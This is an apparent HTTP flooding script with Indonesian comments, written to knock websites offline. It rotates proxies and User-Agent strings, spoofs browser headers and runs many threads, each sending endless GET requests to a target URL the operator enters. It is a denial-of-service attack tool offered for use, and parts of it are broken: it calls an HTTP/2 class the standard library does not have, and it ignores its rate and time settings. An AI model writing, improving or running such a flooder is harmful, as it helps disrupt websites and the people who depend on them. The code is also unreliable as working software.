import socket
import http.client
import ssl
import threading
from urllib.parse import urlparse
import random

# Baca daftar proxy dari file
proxy_file = "proxy.txt"
with open(proxy_file) as f:
    proxies = f.read().splitlines()

# Baca daftar User-Agent dari file
user_agent_file = "ua.txt"
with open(user_agent_file) as f:
    user_agents = f.read().splitlines()

def http_request(target, proxy, headers):
    target_url = urlparse(target)
    proxy_host, proxy_port = proxy.split(":")
    
    # Buat koneksi ke proxy
    conn = http.client.HTTPSConnection(proxy_host, int(proxy_port))
    conn.set_tunnel(target_url.netloc, 443)
    
    # Kirim request
    conn.request("CONNECT", target_url.netloc)
    response = conn.getresponse()
    
    if response.status == 200:
        # Proxy merespon dengan HTTP 200, koneksi sukses
        tls_conn = ssl.wrap_socket(conn.sock, ssl_version=ssl.PROTOCOL_TLS)
        http2_conn = http.client.HTTP20Connection(target_url.netloc, tls_conn)
        
        while True:
            # Kirim permintaan HTTP/2 dengan header yang ditentukan
            http2_conn.request("GET", target_url.path, headers=headers)
            response = http2_conn.get_response()
            
    # Tutup koneksi
    conn.close()

def run_flooder(target, proxies, user_agents, rate, threads):
    while True:
        # Pilih proxy dan User-Agent secara acak
        proxy = random.choice(proxies)
        user_agent = random.choice(user_agents)
        
        # Buat header untuk request HTTP/2
        headers = {
            ":method": "GET",
            ":path": target,
            ":scheme": "https",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3",
            "accept-encoding": "gzip, deflate, br",
            "x-forwarded-proto": "https",
            "cache-control": "no-cache, no-store,private, max-age=0, must-revalidate",
            "sec-ch-ua-mobile": random.choice(["?0", "?1"]),
            "sec-ch-ua-platform": random.choice(["Android", "iOS", "Linux", "macOS", "Windows"]),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "upgrade-insecure-requests": "1",
            "user-agent": user_agent,
        }
        
        # Kirim permintaan HTTP ke target melalui proxy
        http_request(target, proxy, headers)

if __name__ == "__main__":
    target = input("Masukkan URL target: ")
    time = int(input("Masukkan waktu (detik): "))
    rate = int(input("Masukkan laju permintaan per detik: "))
    threads = int(input("Masukkan jumlah utas: "))
    
    for i in range(threads):
        thread = threading.Thread(target=run_flooder, args=(target, proxies, user_agents, rate, threads))
        thread.start()
    
    input(f"Serangan dimulai selama {time} detik. Tekan Enter untuk menghentikannya...")
